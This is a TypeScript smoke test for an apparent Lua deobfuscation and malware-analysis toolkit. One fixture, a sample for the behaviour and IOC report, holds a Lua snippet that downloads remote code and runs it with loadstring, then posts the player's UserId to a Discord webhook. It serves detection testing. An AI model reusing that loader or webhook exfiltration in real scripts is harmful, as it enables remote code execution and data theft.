// Smoke test for every PRISM tool (the same registry the web UI, HTTP API and MCP server use).
//   npx tsx packages/tools/test/smoke.ts [-v]
import { createContext, runTool, listTools, hasNative } from '../src/index.ts';
import { rmSync, writeFileSync, mkdtempSync, readFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

const verbose = process.argv.includes('-v');
const root = mkdtempSync(join(tmpdir(), 'prism-smoke-'));
const ctx = createContext({ workspace: join(root, 'ws') });
const SAMPLES = join(process.cwd(), 'apps/web/public/samples');
const tools = listTools();
const used = new Set<string>();
let fails = 0;
const show = async (n: string, a: Record<string, unknown>, lines = 6) => {
  used.add(n);
  const t0 = Date.now();
  try {
    const r = await runTool(n, a, ctx);
    console.log(`ok   ${n.padEnd(24)} ${String(Date.now() - t0).padStart(5)}ms ${r.fullLength ?? r.text.length} chars`);
    if (verbose) console.log(r.text.split('\n').slice(0, lines).map(l => '     | ' + l).join('\n'));
    return r;
  } catch (e) { fails++; console.log(`FAIL ${n.padEnd(24)} ${(e as Error).message}`); return null; }
};
const native = hasNative(ctx.luauDir, 'luau-compile');

await show('prism_guide', {});
const add = await show('workspace_add_script', { path: join(SAMPLES, 'ironbrew2_1.lua') });
const id = (add!.data as { id: string }).id;
await show('workspace_list', {});
await show('workspace_get_script', { script_id: id, max_chars: 200 });
await show('analyze', { script_id: id });
await show('fingerprint', { script_id: id });
const cl = await show('deobfuscate', { script_id: id, rename: 'obfuscated', save_script_as: 'ib2.clean.lua' });
const cid = (cl!.data as { savedScriptId: string }).savedScriptId;
await show('call_graph', { script_id: cid, format: 'mermaid' });
await show('list_functions', { script_id: cid, sort: 'size', max: 5 });
await show('vm_detect', { script_id: cid });
await show('tokenize', { script_id: cid, from_line: 1, to_line: 2 });
await show('simplify_expression', { expression: 'bit32.bxor(0x5A, 3) + #"abc"\n(5 * 2) // 3' });
await show('get_lines', { script_id: cid, line: 10, context: 2 });
await show('find_text', { script_id: cid, pattern: 'string\\.(byte|char|sub)', regex: true, context: 0, max: 3 });
await show('pattern_search', { script_id: cid, pattern: 'string.char($$$)', max: 3 });
await show('xrefs', { script_id: cid, name: 'fn1' });
await show('get_function', { script_id: cid, query: 'fn1' });
await show('constants', { script_id: cid, section: 'decoders', max: 3 });
await show('strings', { script_id: cid, min_len: 8, max: 4 });
await show('vm_anatomy', { script_id: cid, max_chunks: 8 });
await show('vm_anatomy', { script_id: id, clean: true, format: 'json', save_script_as: 'ib2.anat.lua', max_chars: 2000 });
await show('vm_boot_dump', { script_id: id, run: false, max_chars: 2000 });
await show('vm_lift', { source: 'local a = 1\nprint(a)', max_chars: 1000 });
await show('vm_protos', { source: 'local function f(a) return a + 1 end\nlocal t = {}\nfunction t.g(x) return f(x) * 2, "s", string.format("%d", x) end\nprint(t.g(3))', max_chars: 2000 });
await show('vm_protos', { source: 'local PROTOS = {}\nPROTOS[1] = function(k, e) return function() local r = {} r[1] = 5 local u = {} local c = PROTOS[2](u) u[0] = { [1] = 1, [2] = r } u[1] = k[0] return c end end\nPROTOS[2] = function(k, e) return function() return k[0][2][k[0][1]], k[1], "x" end end', max_chars: 2000 });
await show('opcode_map', { script_id: cid, clean: false, lifted: false, save_opmap_as: 'ib2', max_trees: 2 });
await show('opmap_get', {});
await show('opmap_get', { name: 'ib2' });
await show('opmap_set', { name: 'ib2', set: { '0': { name: 'MOVE_FUSED', lua: 'R[A] = R[B]' } } });
await show('vm_disasm', { instructions: '{{0,1,2,0},{7,0,0,0},{2,1,"x",3}}', opmap: 'ib2', fields: { '1': 'A', '2': 'B', '3': 'C' }, op_field: 0 });
await show('python_transpile', { script_id: cid, function: 'fn1', prelude: false });
// static decoding loop: decoder → Python (__main__ evaluates every call site) → JSON → inline_values
const DEC = 'local function dec(s) local o = {} for i = 1, #s do o[i] = string.char(string.byte(s, i) - 1) end return table.concat(o) end\nprint(dec("Ifmmp"), dec("xpsme"))\nlocal t = { dec("bc"), dec("Ifmmp") }\nreturn t\n';
const pt = await show('python_transpile', { source: DEC, function: 'dec', max_calls: 50 });
let vals = '{"L2:7":"Hello","L2:21":"world","L3:13":"ab","L3:24":"Hello"}';
try {
  const py = join(root, 'dec.py'), out = join(root, 'dec.json');
  writeFileSync(py, pt!.text);
  execFileSync('python3', [py, out], { timeout: 30000, stdio: 'ignore' });
  vals = readFileSync(out, 'utf8');
  console.log('     python3 ran the generated program → ' + vals.replace(/\s+/g, ' ').slice(0, 120));
} catch { console.log('     (python3 not available — using precomputed values)'); }
const ls = await show('lua_slice', { source: DEC, function: 'dec' }, 10);
if (ls && !(/__site\(\{"L2:7"\}/.test(ls.text) || /"L2:7"/.test(ls.text))) { fails++; console.log('FAIL lua_slice harness misses call site L2:7:\n' + ls.text.slice(0, 500)); }
const MULTI = 'local key = 7\nlocal function d1(s) local o = {} for i = 1, #s do o[i] = string.char(bit32.bxor(string.byte(s, i), key)) end return table.concat(o) end\nlocal function d2(n) return n * 3 end\nprint(d1("Hello"), d2(14), d1("ob"))\n';
for (const lang of ['python', 'lua']) {
  const db = await show('decode_bundle', { source: MULTI, functions: ['d1', 'd2'], lang }, 6);
  if (db && !(/2 decoder\(s\), 3 call site/.test(db.text))) { fails++; console.log(`FAIL decode_bundle ${lang}:\n` + db.text.slice(0, 500)); }
  if (db && lang === 'python') {
    try {
      const f = join(root, 'bundle.py'); writeFileSync(f, db.text);
      const out = JSON.parse(execFileSync('python3', [f], { timeout: 60000, stdio: ['ignore', 'pipe', 'ignore'] }).toString());
      if (out['L4:7'] !== 'Obkkh' || out['L4:20'] !== 42) { fails++; console.log('FAIL decode_bundle python run: ' + JSON.stringify(out)); } else console.log('     python3 ran the bundle → ' + JSON.stringify(out));
    } catch (e) { console.log('     (python3 not available for the bundle roundtrip: ' + (e as Error).message.slice(0, 80) + ')'); }
  }
}
const iv = await show('inline_values', { source: DEC, values: vals, save_script_as: 'dec.inlined.lua' }, 8);
if (iv && !/4 call site\(s\) replaced/.test(iv.text)) { fails++; console.log('FAIL inline_values did not replace all 4 call sites:\n' + iv.text.slice(0, 400)); }
await show('chunk_disasm', { chunk: '{ {{3,0,1},{7,0,2},{12,0,1,1}}, { { {{3,1,2}}, {}, {"x"} } }, {"print","hello"} }', opmap_inline: { '3': { name: 'LOADK', lua: 'R[A] = K[B]' }, '7': 'GETGLOBAL', '12': 'CALL' } }, 14);
await show('chunk_disasm', { chunk: JSON.stringify([[141, 0, 'loadstring'], [74, 1, 1, { $bytes: '48747470476574' }], [254, 0, 2, 1]]), script_id: cid, max: 5 }, 8);
// behaviour / IOC report: names in code + decoded strings (+ $bytes inside a dumped chunk)
const BEH = 'local H = game:GetService("HttpService")\nlocal s = game:HttpGet("https://raw.githubusercontent.com/x/y/main/a.lua")\nloadstring(s)()\nrequest({Url = "https://discord.com/api/webhooks/1/abc", Method = "POST", Body = H:JSONEncode({id = game.Players.LocalPlayer.UserId})})\nsetclipboard("hi")';
const bh = await show('behavior_report', { source: BEH, strings: '["https://api.ipify.org"]' }, 12);
if (bh && !(/discord-webhook/.test(bh.text) && /ip-lookup/.test(bh.text) && /Remote \/ dynamic code loading/.test(bh.text))) { fails++; console.log('FAIL behavior_report missed webhook / ip lookup / loader:\n' + bh.text.slice(0, 600)); }
const bc = await show('behavior_report', { chunk: JSON.stringify({ k: [{ $bytes: Buffer.from('writefile').toString('hex') }, 'https://pastebin.com/raw/x'] }) });
if (bc && !(/writefile/.test(bc.text) && /pastebin/.test(bc.text))) { fails++; console.log('FAIL behavior_report chunk strings:\n' + bc.text.slice(0, 600)); }
await show('lua_literal_to_json', { literal: '{1, 2, {x = "y"}, [10] = true}' });
if (native) {
  await show('luau_compile', { source: 'local x = 1 for i=1,10 do x = x * i end print(x)', mode: 'prism' });
  await show('luau_compile', { source: 'local x = 1 print(x + 2)', mode: 'text' });
  await show('luau_compile', { source: 'local x = 1 print(x + 2)', mode: 'summary' });
  const bin = await show('luau_compile', { source: 'local t = {} for i = 1, 3 do t[i] = ("x"):rep(i) end print(table.concat(t, ","))', mode: 'binary', save_as: 'x.luauc' });
  await show('bytecode_disasm', { output: 'x.luauc', style: 'luau' });
  await show('bytecode_disasm', { output: 'x.luauc', style: 'rich', max_insns: 8 });
  const hex = (bin!.data as { hex: string }).hex;
  const esc = [...Buffer.from(hex, 'hex')].map(b => '\\' + b).join('');
  const emb = join(root, 'emb.lua');
  writeFileSync(emb, `local payload = "${esc}"\nreturn payload\n`);
  await show('find_embedded_bytecode', { path: emb });
  await show('luau_analyze', { source: 'local x: number = "a"\nprint(y)' });
  await show('luau_ast', { source: 'local x = 1', max_chars: 300 });
} else console.log('skip native luau tools (run npm run fetch-luau)');
await show('blob_info', { data: '\\27Lua\\81\\0\\1\\4\\8', encoding: 'lua' });
await show('blob_transform', { data: 'SGVsbG8gV29ybGQ=', steps: [{ op: 'base64' }, { op: 'xor', arg: '0x20' }], out: 'latin1' });
await show('blob_auto', { data: '48656c6c6f20576f726c6421' });
await show('blob_xor', { data: Buffer.from('local x = 1 print(x) local y = 2', 'latin1').map(b => b ^ 0x37).toString('hex'), encoding: 'hex' });
await show('rename_symbols', { script_id: cid, renames: [{ name: 'fn1', to: 'decode', all: true }], save_script_as: 'ib2.named.lua' });
await show('workspace_note', { script_id: cid, note: 'fn1 is the string decoder', tags: ['ironbrew'] });
const lr = await show('lift_report', { source: 'local function mk(a) local b = a * 2 return function(x) return x + a + b end end\nprint(mk(1)(2))' }, 8);
if (lr && !/captures:/.test(lr.text)) { fails++; console.log('FAIL lift_report: no captures line:\n' + lr.text.slice(0, 400)); }
const al = await show('auto_lift', { source: 'local x = 1\nlocal function f(a) return a + x end\nprint(f(2))', name: 'tiny.lua' }, 14);
if (al && !/## steps/.test(al.text)) { fails++; console.log('FAIL auto_lift: no steps table:\n' + al.text.slice(0, 400)); }
await show('auto_triage', { path: join(SAMPLES, 'prometheus_weak_1.lua') });
await show('workspace_save_output', { name: 'note.txt', content: 'hello' });
await show('workspace_read_output', { name: 'note.txt' });
await show('workspace_delete', { kind: 'output', id: 'note.txt' });
const la = await show('lift_audit', { source: 'local h = table.create(4)\nh[1] = x[nil]\nh["k"] = 1\nif not not h[1] then print(h[1] .. nil) end', max_chars: 2000 }, 8);
if (la && !/run-time breaker/.test(la.text)) { fails++; console.log('FAIL lift_audit: no summary line:\n' + la.text.slice(0, 400)); }
await show('luau_run', { source: 'print(1 + 1)', max_chars: 500 });
await show('vm_chain', { source: 'print(1)', max_chars: 800 });
const missing = tools.map(t => t.name).filter(n => !used.has(n));
console.log(`\n${tools.length} tools, ${used.size} exercised, ${fails} failures${missing.length ? ' — not exercised: ' + missing.join(', ') : ''}`);
rmSync(root, { recursive: true, force: true });
process.exit(fails ? 1 : 0);
